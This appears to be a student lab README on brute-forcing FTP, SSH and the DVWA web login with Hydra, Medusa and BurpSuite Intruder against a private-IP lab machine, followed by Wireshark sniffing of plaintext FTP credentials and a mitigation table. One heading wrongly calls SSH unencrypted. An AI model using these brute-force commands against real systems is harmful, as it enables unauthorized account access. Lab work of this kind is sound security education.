
---

```markdown
# 🔐 Cryptography Project  
### 🚀 Brute Force & Traffic Analysis on Network Protocols

[![Built with ❤️ in Kali Linux](https://img.shields.io/badge/Built%20with-❤️%20in%20Kali%20Linux-red?style=flat-square)]()  
[![Tools Used](https://img.shields.io/badge/Tools-Hydra%2C%20Medusa%2C%20BurpSuite%2C%20Wireshark-blueviolet?style=flat-square)]()  
[![Security](https://img.shields.io/badge/Security-Focus-red?style=flat-square)]()

---

## 🎯 Objective
- 🔍 Explore vulnerabilities in network protocols  
- 💥 Perform brute-force attacks on services  
- 📊 Analyze traffic using Wireshark  

---

## 🧑‍💻 Discovering Usernames

```bash
nmap -sV -p- <target machine>
```
![Nmap Scan](image-1.png)

---

## 🗒️ Creating `users.txt` and `passwords.txt`

```bash
echo -e "msfadmin\nroot\nadmin" > users.txt
echo -e "msfadmin\n1234\ntoor\npassword" > passwords.txt
```
![Users and Passwords Files](image-2.png)

---

## 🚀 Brute Forcing

### 📁 FTP (Port 21)

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.109.136
```
![FTP Hydra Attack](image-3.png)

---

### 🔐 SSH (Port 22)

#### Using Hydra:
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.109.136
```
![SSH Hydra Attack](image-5.png)

#### Using Medusa:
```bash
medusa -h 192.168.109.136 -U users.txt -P passwords.txt -M ssh
```
![Medusa Attack](image-6.png)

---

### 🔑 Manual SSH Login (After Success)

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.109.136
```
![Manual SSH Login](image-8.png)

---

## 🌐 Web App Login Brute Force (DVWA on HTTP)

Browse to: [http://192.168.109.136](http://192.168.109.136)  
DVWA Login Page:
![DVWA](image-9.png)

```bash
hydra -L users.txt -P passwords.txt 192.168.109.136 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
![Hydra Web Attack](image-10.png)

---

### 🔓 After Login
- Go to `DVWA Security`
- Set to `Low`
![DVWA Security Settings](image-12.png)

---

## 🎯 Brute Forcing Web Logins via BurpSuite Intruder

### 🛠 Step 1: Configure Proxy

- Proxy: `127.0.0.1:8080`  
![Burp Proxy Setup](image-13.png)

Verify: [http://burpsuite](http://burpsuite)  
![Burp Home](image-14.png)

---

### ✉️ Step 2: Intercept Login Request

- Login with dummy credentials  
- Capture the POST request  
![Captured POST Request](image-16.png)

---

### 🚀 Step 3: Send to Intruder

- Highlight password field → Add Intruder position  
```http
username=admin&password=§test§&Login=Login
```
![Set Positions](image-19.png)

---

### 🧨 Step 4: Add Payloads

- Payload type: `Simple list`  
- Load from `passwords.txt`  
![Load Payloads](image-20.png)

🧾 **Results:**  
![Intruder Attack Result](image-21.png)

---

## 📡 Wireshark Traffic Sniffing

1. Start Wireshark on `eth0`  
2. Run:
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.109.136
```
![Hydra During Capture](image-22.png)

Captured traffic:
- Credentials seen in **plaintext**!
![Captured FTP Credentials](image-24.png)

---

## 🧠 Key Observations

- 🔓 **FTP is unencrypted**
- 🪪 Credentials are visible in packets
- ⚠️ TCP Reset packets indicate connection drops

![TCP Reset](image-25.png)
---

 🔓 **SSH is unencrypted**
 medusa -h 192.168.109.136 -U users.txt -P passwords.txt -M ssh

 ![alt text](image-29.png)
 ![alt text](image-30.png)
---

## 🔒 Protocol Security Comparison

### ✅ Encrypted Protocols

| Protocol | Port | Security |
|----------|------|----------|
| **HTTPS** | 443 | 🔐 Encrypted (TLS) |

```plaintext
tcp.port == 443
```
![HTTPS Traffic](image-26.png)

---

### ❌ Plaintext Protocols

| Protocol | Port | Risk |
|----------|------|------|
| **FTP** | 21 | 🚨 Plaintext credentials |

```plaintext
tcp contains "USER "
tcp contains "PASS "
```
![FTP USER Command](image-27.png)  
![FTP PASS Command](image-28.png)

---

## 🧩 Problems Faced & Fixes

| Issue | Solution |
|-------|----------|
| SSH login failed (algo mismatch) | Added `-oHostKeyAlgorithms=+ssh-rsa` |
| `users.txt` not found | Verified path and file location |
| Hydra failed on SSH | Switched to Medusa |

---

## 🛡️ Mitigation Strategies

| Protocol | Vulnerability | Mitigation |
|----------|---------------|------------|
| **FTP** | Plaintext creds | Use **SFTP / FTPS** |
| **Telnet** | No encryption | Use **SSH** |
| **SSH** | Brute-forceable | Use **key auth**, `fail2ban`, rate-limiting |
| **HTTP** | Plaintext login | Use **HTTPS**, CAPTCHA, lockouts |

---

## 🧾 Final Thoughts

> This project shows how **insecure protocols can leak sensitive information** and demonstrates the importance of encrypted communication and effective brute-force mitigation techniques.

---

```

---
